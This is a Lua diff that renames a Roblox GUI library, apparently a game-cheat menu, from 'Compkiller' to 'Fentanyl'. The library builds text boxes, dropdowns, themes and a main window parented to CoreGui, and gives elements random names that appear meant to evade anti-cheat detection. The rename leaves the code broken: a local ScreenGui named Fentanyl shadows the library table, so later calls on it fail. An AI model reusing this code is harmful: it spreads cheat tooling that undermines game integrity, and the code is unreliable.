-			Config = Compkiller.__CONFIG(Config , {
+			Config = Fentanyl.__CONFIG(Config , {
 				Name = "TextBox",
 				Default = "",
 				Placeholder = "Placeholder",
@@ -4366,11 +4366,11 @@
 			local TextBox_2 = Instance.new("TextBox")
 			local BlockLine = Instance.new("Frame")
 
-			if Compkiller:_IsMobile() then
-				Compkiller:_AddDragBlacklist(TextBox);
+			if Fentanyl:_IsMobile() then
+				Fentanyl:_AddDragBlacklist(TextBox);
 			end;
 
-			TextBox.Name = Compkiller:_RandomString()
+			TextBox.Name = Fentanyl:_RandomString()
 			TextBox.Parent = Parent
 			TextBox.BackgroundTransparency = 1.000
 			TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -4378,7 +4378,7 @@
 			TextBox.Size = UDim2.new(1, -1, 0, 30)
 			TextBox.ZIndex = Zindex + 1
 
-			BlockText.Name = Compkiller:_RandomString()
+			BlockText.Name = Fentanyl:_RandomString()
 			BlockText.Parent = TextBox
 			BlockText.AnchorPoint = Vector2.new(0, 0.5)
 			BlockText.BackgroundTransparency = 1.000
@@ -4389,35 +4389,35 @@
 			BlockText.ZIndex = Zindex + 2
 			BlockText.Font = Enum.Font.GothamMedium
 			BlockText.Text = Config.Name
-			BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+			BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
 			BlockText.TextSize = 14.000
 			BlockText.TextTransparency = 0.300
 			BlockText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor,{
+			table.insert(Fentanyl.Elements.SwitchColor,{
 				Element = BlockText,
 				Property = "TextColor3"
 			})
 
-			LinkValues.Name = Compkiller:_RandomString()
+			LinkValues.Name = Fentanyl:_RandomString()
 			LinkValues.Parent = TextBox
 			LinkValues.AnchorPoint = Vector2.new(1, 0.540000021)
-			LinkValues.BackgroundColor3 = Compkiller.Colors.DropColor
+			LinkValues.BackgroundColor3 = Fentanyl.Colors.DropColor
 			LinkValues.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			LinkValues.BorderSizePixel = 0
 			LinkValues.Position = UDim2.new(1, -12, 0.5, 0)
 			LinkValues.Size = UDim2.new(0, 95, 0, 16)
 			LinkValues.ZIndex = Zindex + 3
 
-			table.insert(Compkiller.Elements.DropColor,{
+			table.insert(Fentanyl.Elements.DropColor,{
 				Element = LinkValues,
 				Property = "BackgroundColor3"
 			})
 
-			UIStroke.Color = Compkiller.Colors.StrokeColor
+			UIStroke.Color = Fentanyl.Colors.StrokeColor
 			UIStroke.Parent = LinkValues
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			})
@@ -4439,18 +4439,18 @@
 			TextBox_2.Font = Enum.Font.GothamMedium
 			TextBox_2.PlaceholderText = Config.Placeholder
 			TextBox_2.Text = Config.Default
-			TextBox_2.TextColor3 = Compkiller.Colors.SwitchColor
+			TextBox_2.TextColor3 = Fentanyl.Colors.SwitchColor
 			TextBox_2.TextSize = 11.000
 
-			table.insert(Compkiller.Elements.SwitchColor,{
+			table.insert(Fentanyl.Elements.SwitchColor,{
 				Element = TextBox_2,
 				Property = "TextColor3"
 			})
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = TextBox
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -4458,7 +4458,7 @@
 			BlockLine.Size = UDim2.new(1, -26, 0, 1)
 			BlockLine.ZIndex = Zindex + 3;
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			})
@@ -4469,7 +4469,7 @@
 
 				local MainScale = ((scale.X > Base.X) and scale.X) or Base.X;
 
-				Compkiller:_Animation(LinkValues,TweenInfo.new(0.25),{
+				Fentanyl:_Animation(LinkValues,TweenInfo.new(0.25),{
 					Size = UDim2.fromOffset(math.clamp(MainScale + 7 , Base.X , TextBox.AbsoluteSize.X / 2) , 16)
 				})
 			end;
@@ -4527,36 +4527,36 @@
 
 			Args.Signal = Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockText,TweenInfo.new(0.2),{
 						TextTransparency = 0.3
 					});
 
-					Compkiller:_Animation(BlockLine,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockLine,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0.5
 					});
 
-					Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 						Transparency = 0
 					});
 
-					Compkiller:_Animation(LinkValues,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(LinkValues,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0
 					});
 
 				else
-					Compkiller:_Animation(BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockText,TweenInfo.new(0.2),{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(BlockLine,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockLine,TweenInfo.new(0.2),{
 						BackgroundTransparency = 1
 					});
 
-					Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 						Transparency = 1
 					});
 
-					Compkiller:_Animation(LinkValues,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(LinkValues,TweenInfo.new(0.2),{
 						BackgroundTransparency = 1
 					});
 
@@ -4568,14 +4568,14 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddDropdown(Config : Dropdown)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Name = "Dropdown",
 				Default = nil,
 				Values = {"Item 1","Item 2","Item 3"},
@@ -4626,7 +4626,7 @@
 			local ValueText = Instance.new("TextLabel")
 			local MainButton = Instance.new("ImageButton")
 
-			Dropdown.Name = Compkiller:_RandomString()
+			Dropdown.Name = Fentanyl:_RandomString()
 			Dropdown.Parent = Parent
 			Dropdown.BackgroundTransparency = 1.000
 			Dropdown.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -4634,7 +4634,7 @@
 			Dropdown.Size = UDim2.new(1, -1, 0, 55)
 			Dropdown.ZIndex = Zindex + 2
 
-			BlockText.Name = Compkiller:_RandomString()
+			BlockText.Name = Fentanyl:_RandomString()
 			BlockText.Parent = Dropdown
 			BlockText.BackgroundTransparency = 1.000
 			BlockText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -4644,7 +4644,7 @@
 			BlockText.ZIndex = Zindex + 3
 			BlockText.Font = Enum.Font.GothamMedium
 			BlockText.Text = Config.Name
-			BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+			BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
 			BlockText.TextSize = 14.000
 			BlockText.TextTransparency = 0.100
 			BlockText.TextXAlignment = Enum.TextXAlignment.Left
@@ -4653,15 +4653,15 @@
 				Dropdown.Size = UDim2.new(1, -1, 0, 25)
 			end;
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = BlockText,
 				Property = 'TextColor3'
 			});
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = Dropdown
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -4669,12 +4669,12 @@
 			BlockLine.Size = UDim2.new(1, -26, 0, 1)
 			BlockLine.ZIndex = Zindex + 3
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			});
 
-			LinkValues.Name = Compkiller:_RandomString()
+			LinkValues.Name = Fentanyl:_RandomString()
 			LinkValues.Parent = Dropdown
 			LinkValues.AnchorPoint = Vector2.new(1, 0.540000021)
 			LinkValues.BackgroundTransparency = 1.000
@@ -4691,10 +4691,10 @@
 			UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
 			UIListLayout.Padding = UDim.new(0, 8)
 
-			ValueItems.Name = Compkiller:_RandomString()
+			ValueItems.Name = Fentanyl:_RandomString()
 			ValueItems.Parent = Dropdown
 			ValueItems.AnchorPoint = Vector2.new(0.5, 1)
-			ValueItems.BackgroundColor3 = Compkiller.Colors.DropColor
+			ValueItems.BackgroundColor3 = Fentanyl.Colors.DropColor
 			ValueItems.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			ValueItems.BorderSizePixel = 0
 			ValueItems.ClipsDescendants = true
@@ -4702,15 +4702,15 @@
 			ValueItems.Size = UDim2.new(1, -25, 0, 18)
 			ValueItems.ZIndex = Zindex + 5
 
-			table.insert(Compkiller.Elements.DropColor , {
+			table.insert(Fentanyl.Elements.DropColor , {
 				Element = ValueItems,
 				Property = "BackgroundColor3"
 			})
 
-			UIStroke.Color = Compkiller.Colors.StrokeColor
+			UIStroke.Color = Fentanyl.Colors.StrokeColor
 			UIStroke.Parent = ValueItems
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			});
@@ -4718,7 +4718,7 @@
 			UICorner.CornerRadius = UDim.new(0, 3)
 			UICorner.Parent = ValueItems
 
-			ValueText.Name = Compkiller:_RandomString()
+			ValueText.Name = Fentanyl:_RandomString()
 			ValueText.Parent = ValueItems
 			ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
 			ValueText.BackgroundTransparency = 1.000
@@ -4729,16 +4729,16 @@
 			ValueText.ZIndex = Zindex + 8
 			ValueText.Font = Enum.Font.Gotham
 			ValueText.Text = DaTabarser(Config.Default)
-			ValueText.TextColor3 = Compkiller.Colors.SwitchColor
+			ValueText.TextColor3 = Fentanyl.Colors.SwitchColor
 			ValueText.TextSize = 11.000
 			ValueText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = ValueText,
 				Property = 'TextColor3'
 			});
 
-			MainButton.Name = Compkiller:_RandomString()
+			MainButton.Name = Fentanyl:_RandomString()
 			MainButton.Parent = ValueItems
 			MainButton.AnchorPoint = Vector2.new(1, 0.5)
 			MainButton.BackgroundTransparency = 1.000
@@ -4749,20 +4749,20 @@
 			MainButton.ZIndex = Zindex + 5
 			MainButton.Image = "rbxassetid://10709790948"
 
-			Compkiller:_Hover(ValueItems,function()
-				Compkiller:_Animation(ValueItems,TweenInfo.new(0.3),{
-					BackgroundColor3 = Compkiller.Colors.MouseEnter
+			Fentanyl:_Hover(ValueItems,function()
+				Fentanyl:_Animation(ValueItems,TweenInfo.new(0.3),{
+					BackgroundColor3 = Fentanyl.Colors.MouseEnter
 				});
 			end,function()
-				Compkiller:_Animation(ValueItems,TweenInfo.new(0.3),{
-					BackgroundColor3 = Compkiller.Colors.DropColor
+				Fentanyl:_Animation(ValueItems,TweenInfo.new(0.3),{
+					BackgroundColor3 = Fentanyl.Colors.DropColor
 				});
 			end);
 
 			local repi;
-			local Button = Compkiller:_Input(ValueItems);
+			local Button = Fentanyl:_Input(ValueItems);
 
-			repi = Compkiller:_LoadDropdown(Button,function(value)
+			repi = Fentanyl:_LoadDropdown(Button,function(value)
 				Config.Default = value;
 
 				repi:SetData(Config.Default,Config.Values,Config.Multi,false);
@@ -4775,11 +4775,11 @@
 
 			repi.EventOut:Connect(function(v)
 				if v then
-					Compkiller:_Animation(MainButton,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(MainButton,TweenInfo.new(0.2),{
 						Rotation = -180
 					})
 				else
-					Compkiller:_Animation(MainButton,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(MainButton,TweenInfo.new(0.2),{
 						Rotation = 0
 					})
 				end;
@@ -4810,59 +4810,59 @@
 
 			Args.Signal = Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockText,TweenInfo.new(0.2),{
 						TextTransparency = 0.100
 					});
 
-					Compkiller:_Animation(BlockLine,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockLine,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0.100
 					});
 
-					Compkiller:_Animation(ValueItems,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ValueItems,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0
 					});
 
-					Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 						Transparency = 0
 					});
 
-					Compkiller:_Animation(ValueText,TweenInfo.new(0.32),{
+					Fentanyl:_Animation(ValueText,TweenInfo.new(0.32),{
 						TextTransparency = 0
 					});
 
-					Compkiller:_Animation(MainButton,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(MainButton,TweenInfo.new(0.2),{
 						ImageTransparency = 0
 					});
 				else
-					Compkiller:_Animation(BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockText,TweenInfo.new(0.2),{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(BlockLine,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockLine,TweenInfo.new(0.2),{
 						BackgroundTransparency = 1 
 					});
 
-					Compkiller:_Animation(ValueItems,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ValueItems,TweenInfo.new(0.2),{
 						BackgroundTransparency = 1
 					});
 
-					Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 						Transparency = 1
 					});
 
-					Compkiller:_Animation(ValueText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ValueText,TweenInfo.new(0.2),{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(MainButton,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(MainButton,TweenInfo.new(0.2),{
 						ImageTransparency = 1
 					});
 				end;
 			end);
 
-			Args.Link = Compkiller:_LoadOption({
+			Args.Link = Fentanyl:_LoadOption({
 				AddLink = function(self ,Name , Default)
-					return Compkiller:_AddLinkValue(Name , Default , LinkValues , LinkValues , {
+					return Fentanyl:_AddLinkValue(Name , Default , LinkValues , LinkValues , {
 						Tween = TweenInfo.new(0.2)	
 					} , Signal);
 				end,
@@ -4874,7 +4874,7 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
@@ -4883,13 +4883,13 @@
 		return Args;
 	end;
 
-	function Compkiller:GetTheme()
-		return Compkiller.Colors;
+	function Fentanyl:GetTheme()
+		return Fentanyl.Colors;
 	end;
 
-	function Compkiller:SetTheme(name)
+	function Fentanyl:SetTheme(name)
 		if name == "Dark Green" then
-			Compkiller.Colors = {
+			Fentanyl.Colors = {
 				["BGDBColor"] = Color3.new(0.0429964, 0.110345, 0.0727226),
 				["BlockBackground"] = Color3.new(0.159287, 0.234483, 0.201811),
 				["BlockColor"] = Color3.new(0, 0.137931, 0.0951249),
@@ -4904,7 +4904,7 @@
 				HighStrokeColor = Color3.new(0, 0.241379, 0.186445),
 			};
 		elseif name == "Default" then
-			Compkiller.Colors = {
+			Fentanyl.Colors = {
 				Highlight = Color3.fromRGB(17, 238, 253),
 				Toggle = Color3.fromRGB(14, 203, 213),
 				Risky = Color3.fromRGB(251, 255, 39),
@@ -4919,7 +4919,7 @@
 				HighStrokeColor = Color3.fromRGB(55, 56, 63),
 			};
 		elseif name == "Dark Blue" then
-			Compkiller.Colors = {
+			Fentanyl.Colors = {
 				["BGDBColor"] = Color3.new(0.0393817, 0.0754204, 0.165517),
 				["BlockBackground"] = Color3.new(0, 0.0618311, 0.172414),
 				["BlockColor"] = Color3.new(0, 0.0172414, 0.103448),
@@ -4934,7 +4934,7 @@
 				["Toggle"] = Color3.new(0.054902, 0.463935, 0.835294)
 			}
 		elseif name == "Purple Rose" then
-			Compkiller.Colors = {
+			Fentanyl.Colors = {
 				["BGDBColor"] = Color3.new(0.0459068, 0.030321, 0.117241),
 				["BlockBackground"] = Color3.new(0.156272, 0.119596, 0.324138),
 				["BlockColor"] = Color3.new(0.0948428, 0.0576457, 0.165517),
@@ -4949,7 +4949,7 @@
 				["Toggle"] = Color3.new(0.835294, 0.054902, 0.248654)
 			}
 		elseif name == "Skeet" then		
-			Compkiller.Colors = {
+			Fentanyl.Colors = {
 				["BGDBColor"] = Color3.new(0.114578, 0.125191, 0.151724),
 				["BlockBackground"] = Color3.new(0.128181, 0.131124, 0.151724),
 				["BlockColor"] = Color3.new(0.0732699, 0.0760008, 0.0896552),
@@ -4965,116 +4965,116 @@
 			}
 		end;
 
-		Compkiller:RefreshCurrentColor()
+		Fentanyl:RefreshCurrentColor()
 	end;
 
-	function Compkiller:RefreshCurrentColor()
-		for i,v in next , Compkiller.Elements.Highlight do
+	function Fentanyl:RefreshCurrentColor()
+		for i,v in next , Fentanyl.Elements.Highlight do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.Highlight;
+				v.Element[v.Property] = Fentanyl.Colors.Highlight;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements do
+		for i,v in next , Fentanyl.Elements do
 			if v.Element and v.Property and v.Element:GetAttribute('Enabled') then
-				v.Element[v.Property] = Compkiller.Colors.Highlight;
+				v.Element[v.Property] = Fentanyl.Colors.Highlight;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.Risky do
+		for i,v in next , Fentanyl.Elements.Risky do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.Risky;
+				v.Element[v.Property] = Fentanyl.Colors.Risky;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.BlockColor do
+		for i,v in next , Fentanyl.Elements.BlockColor do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.BlockColor;
+				v.Element[v.Property] = Fentanyl.Colors.BlockColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.BGDBColor do
+		for i,v in next , Fentanyl.Elements.BGDBColor do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.BGDBColor;
+				v.Element[v.Property] = Fentanyl.Colors.BGDBColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.StrokeColor do
+		for i,v in next , Fentanyl.Elements.StrokeColor do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.StrokeColor;
+				v.Element[v.Property] = Fentanyl.Colors.StrokeColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.SwitchColor do
-			if v.Element and v.Property and v.Element[v.Property] ~= Compkiller.Colors.MouseEnter then
-				v.Element[v.Property] = Compkiller.Colors.SwitchColor;
+		for i,v in next , Fentanyl.Elements.SwitchColor do
+			if v.Element and v.Property and v.Element[v.Property] ~= Fentanyl.Colors.MouseEnter then
+				v.Element[v.Property] = Fentanyl.Colors.SwitchColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.BlockBackground do
+		for i,v in next , Fentanyl.Elements.BlockBackground do
 			if v.Element and v.Property and v.Element[v.Property] then
-				v.Element[v.Property] = Compkiller.Colors.BlockBackground;
+				v.Element[v.Property] = Fentanyl.Colors.BlockBackground;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.DropColor do
+		for i,v in next , Fentanyl.Elements.DropColor do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.DropColor;
+				v.Element[v.Property] = Fentanyl.Colors.DropColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.LineColor do
+		for i,v in next , Fentanyl.Elements.LineColor do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.LineColor;
+				v.Element[v.Property] = Fentanyl.Colors.LineColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements.HighStrokeColor do
+		for i,v in next , Fentanyl.Elements.HighStrokeColor do
 			if v.Element and v.Property then
-				v.Element[v.Property] = Compkiller.Colors.HighStrokeColor;
+				v.Element[v.Property] = Fentanyl.Colors.HighStrokeColor;
 			end;
 		end;
 	end;
 
-	function Compkiller:ChangeHighlightColor(NewColor: Color3)
+	function Fentanyl:ChangeHighlightColor(NewColor: Color3)
 		local H,S,V = NewColor:ToHSV();
 
-		Compkiller.Colors.Highlight = NewColor;
-		Compkiller.Colors.Toggle = Color3.fromHSV(H,S,V - 0.2);
+		Fentanyl.Colors.Highlight = NewColor;
+		Fentanyl.Colors.Toggle = Color3.fromHSV(H,S,V - 0.2);
 
-		for i,v in next , Compkiller.Elements.Highlight do
+		for i,v in next , Fentanyl.Elements.Highlight do
 			if v.Element and v.Property then
 				v.Element[v.Property] = NewColor;
 			end;
 		end;
 
-		for i,v in next , Compkiller.Elements do
+		for i,v in next , Fentanyl.Elements do
 			if v.Element and v.Property and v.Element:GetAttribute('Enabled') then
 				v.Element[v.Property] = NewColor;
 			end;
 		end;
 	end;
 
-	function Compkiller.new(Config : Window)
+	function Fentanyl.new(Config : Window)
 
 		if not Config.Scale then
-			if Compkiller:_IsMobile() then
-				Config.Scale = Compkiller.Scale.Mobile;
+			if Fentanyl:_IsMobile() then
+				Config.Scale = Fentanyl.Scale.Mobile;
 			else
-				Config.Scale = Compkiller.Scale.Window;
+				Config.Scale = Fentanyl.Scale.Window;
 			end;
 		end;
 
-		Config = Compkiller.__CONFIG(Config , {
-			Name = "COMPKILLER",
+		Config = Fentanyl.__CONFIG(Config , {
+			Name = "Fentanyl",
 			Keybind = "Insert",
-			Logo = Compkiller.Logo;
-			Scale = Compkiller.Scale.Window,
+			Logo = Fentanyl.Logo;
+			Scale = Fentanyl.Scale.Window,
 			TextSize = 15
 		});
 
-		local TabHover = Compkiller.__SIGNAL(false);
-		local WindowOpen = Compkiller.__SIGNAL(true);
+		local TabHover = Fentanyl.__SIGNAL(false);
+		local WindowOpen = Fentanyl.__SIGNAL(true);
 		local WindowArgs = {
 			SelectedTab = nil,
 			Tabs = {},
@@ -5083,16 +5083,16 @@
 			AlwayShowTab = false,
 			THREADS = {},
 			PerformanceMode = false,
-			Notify = Compkiller.newNotify()
+			Notify = Fentanyl.newNotify()
 		};
 
 		WindowArgs.Username = LocalPlayer.Name;
 
-		if Compkiller:_IsMobile() then
+		if Fentanyl:_IsMobile() then
 			WindowArgs.AlwayShowTab = true;
 		end;
 
-		local CompKiller = Instance.new("ScreenGui")
+		local Fentanyl = Instance.new("ScreenGui")
 		local MainFrame = Instance.new("Frame")
 		local UICorner = Instance.new("UICorner")
 		local TabFrame = Instance.new("Frame")
@@ -5116,21 +5116,21 @@
 			TabButtonScrollingFrame.CanvasSize = UDim2.fromOffset(0,UIListLayout.AbsoluteContentSize.Y)
 		end);
 
-		CompKiller.Name = "u?name=compkiller_"..Compkiller:_RandomString();
-		CompKiller.Parent = CoreGui;
-		CompKiller.ResetOnSpawn = false
-		CompKiller.IgnoreGuiInset = true;
-		CompKiller.ZIndexBehavior = Enum.ZIndexBehavior.Global;
+		Fentanyl.Name = "u?name=Fentanyl_"..Fentanyl:_RandomString();
+		Fentanyl.Parent = CoreGui;
+		Fentanyl.ResetOnSpawn = false
+		Fentanyl.IgnoreGuiInset = true;
+		Fentanyl.ZIndexBehavior = Enum.ZIndexBehavior.Global;
 
-		table.insert(Compkiller.Windows , CompKiller);
+		table.insert(Fentanyl.Windows , Fentanyl);
 
 		MainFrame.Active = true;
-		MainFrame.Name = Compkiller:_RandomString()
-		MainFrame.Parent = CompKiller
+		MainFrame.Name = Fentanyl:_RandomString()
+		MainFrame.Parent = Fentanyl
 		MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-		MainFrame.BackgroundColor3 = Compkiller.Colors.BGDBColor
+		MainFrame.BackgroundColor3 = Fentanyl.Colors.BGDBColor
 
-		table.insert(Compkiller.Elements.BGDBColor,{
+		table.insert(Fentanyl.Elements.BGDBColor,{
 			Element = MainFrame,
 			Property = 'BackgroundColor3'
 		});
@@ -5138,7 +5138,7 @@
 		MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		MainFrame.BorderSizePixel = 0
 		MainFrame.Position = UDim2.fromScale(0.5,0.5);
-		MainFrame.Size = Compkiller.Scale.Window
+		MainFrame.Size = Fentanyl.Scale.Window
 		MainFrame.ZIndex = 4
 
 		MainFrame:GetPropertyChangedSignal('BackgroundTransparency'):Connect(function()
@@ -5149,7 +5149,7 @@
 			end;
 		end)
 
-		Compkiller:_Animation(MainFrame,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
+		Fentanyl:_Animation(MainFrame,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
 			Size = Config.Scale
 		});
 
@@ -5158,12 +5158,12 @@
 		local TabFrameBaseTrans = 0.25;
 
 		TabFrame.Active = true
-		TabFrame.Name = Compkiller:_RandomString()
+		TabFrame.Name = Fentanyl:_RandomString()
 		TabFrame.Parent = MainFrame
 		TabFrame.AnchorPoint = Vector2.new(1, 0)
-		TabFrame.BackgroundColor3 = Compkiller.Colors.BGDBColor
+		TabFrame.BackgroundColor3 = Fentanyl.Colors.BGDBColor
 
-		table.insert(Compkiller.Elements.BGDBColor,{
+		table.insert(Fentanyl.Elements.BGDBColor,{
 			Element = TabFrame,
 			Property = 'BackgroundColor3'
 		});
@@ -5177,12 +5177,12 @@
 
 		UICorner_2.Parent = TabFrame
 
-		LineFrame1.Name = Compkiller:_RandomString()
+		LineFrame1.Name = Fentanyl:_RandomString()
 		LineFrame1.Parent = TabFrame
 		LineFrame1.AnchorPoint = Vector2.new(1, 0)
-		LineFrame1.BackgroundColor3 = Compkiller.Colors.BGDBColor
+		LineFrame1.BackgroundColor3 = Fentanyl.Colors.BGDBColor
 
-		table.insert(Compkiller.Elements.BGDBColor,{
+		table.insert(Fentanyl.Elements.BGDBColor,{
 			Element = LineFrame1,
 			Property = 'BackgroundColor3'
 		});
@@ -5192,7 +5192,7 @@
 		LineFrame1.Position = UDim2.new(1, -5, 0, 0)
 		LineFrame1.Size = UDim2.new(0, 20, 1, 0)
 
-		CompLogo.Name = Compkiller:_RandomString()
+		CompLogo.Name = Fentanyl:_RandomString()
 		CompLogo.Parent = TabFrame
 		CompLogo.BackgroundTransparency = 1.000
 		CompLogo.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5201,7 +5201,7 @@
 		CompLogo.Size = UDim2.new(0, 45, 0, 45)
 		CompLogo.Image = Config.Logo
 
-		WindowLabel.Name = Compkiller:_RandomString()
+		WindowLabel.Name = Fentanyl:_RandomString()
 		WindowLabel.Parent = TabFrame
 		WindowLabel.BackgroundTransparency = 1.000
 		WindowLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5210,16 +5210,16 @@
 		WindowLabel.Size = UDim2.new(0, 200, 0, 25)
 		WindowLabel.Font = Enum.Font.GothamBold
 		WindowLabel.Text = Config.Name
-		WindowLabel.TextColor3 = Compkiller.Colors.SwitchColor
+		WindowLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 		WindowLabel.TextSize = Config.TextSize
 		WindowLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-		table.insert(Compkiller.Elements.SwitchColor , {
+		table.insert(Fentanyl.Elements.SwitchColor , {
 			Element = WindowLabel,
 			Property = 'TextColor3'
 		});
 
-		TabButtons.Name = Compkiller:_RandomString()
+		TabButtons.Name = Fentanyl:_RandomString()
 		TabButtons.Parent = TabFrame
 		TabButtons.BackgroundTransparency = 1.000
 		TabButtons.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5227,16 +5227,16 @@
 		TabButtons.Position = UDim2.new(0, 0, 0, 60)
 		TabButtons.Size = UDim2.new(1, -25, 1, -125)
 
-		SelectionFrame.Name = Compkiller:_RandomString()
+		SelectionFrame.Name = Fentanyl:_RandomString()
 		SelectionFrame.Parent = TabButtons
 		SelectionFrame.AnchorPoint = Vector2.new(1, 0)
-		SelectionFrame.BackgroundColor3 = Compkiller.Colors.Highlight
+		SelectionFrame.BackgroundColor3 = Fentanyl.Colors.Highlight
 		SelectionFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		SelectionFrame.BorderSizePixel = 0
 		SelectionFrame.Position = UDim2.new(1, 5, 0, 28)
 		SelectionFrame.Size = UDim2.new(0, 8, 0, 32)
 
-		table.insert(Compkiller.Elements.Highlight,{
+		table.insert(Fentanyl.Elements.Highlight,{
 			Element = SelectionFrame,
 			Property = "BackgroundColor3"
 		});
@@ -5244,7 +5244,7 @@
 		UICorner_3.CornerRadius = UDim.new(1, 0)
 		UICorner_3.Parent = SelectionFrame
 
-		TabButtonScrollingFrame.Name = Compkiller:_RandomString()
